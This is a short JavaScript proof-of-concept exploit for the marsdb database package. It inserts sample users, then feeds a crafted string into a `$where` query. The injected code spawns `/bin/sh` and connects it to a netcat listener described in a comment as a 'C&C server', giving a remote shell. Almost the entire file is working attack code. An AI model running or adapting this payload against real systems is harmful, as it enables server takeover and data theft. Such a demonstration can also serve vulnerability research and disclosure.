
// if package is uncompressed on package; if installed through npm:
// var marsdb = require('marsdb);
var marsdb = require('./package/index.js')

var u = new marsdb.Collection('users');


// in the C&C server, do like nc -l -p 9999 127.1

var input = `2 || (function (t) { 
                      var r = this.process.mainModule.require;
		      var sh = r('child_process').spawn('/bin/sh',[]);
		      var c = new r('net').Socket();
                      console.trace();
		      c.connect(9999, '127.1', function() {
		        c.write('I am here!!\\n');
		        c.pipe(sh.stdin);
		        sh.stdout.pipe(c);
		        sh.stderr.pipe(c);
		        return true;
		      });
		      return false })(this);
`

u.insert({id: 1, name:'Alice'})
  .then(() => u.insert({id: 2, name:'Bob'}))
  .then(() =>
		u.find({$where: "this.id==="+input}).then(function (users) {
			for (var user of users) {
				console.log('Found user with name', user.name);
			}}));
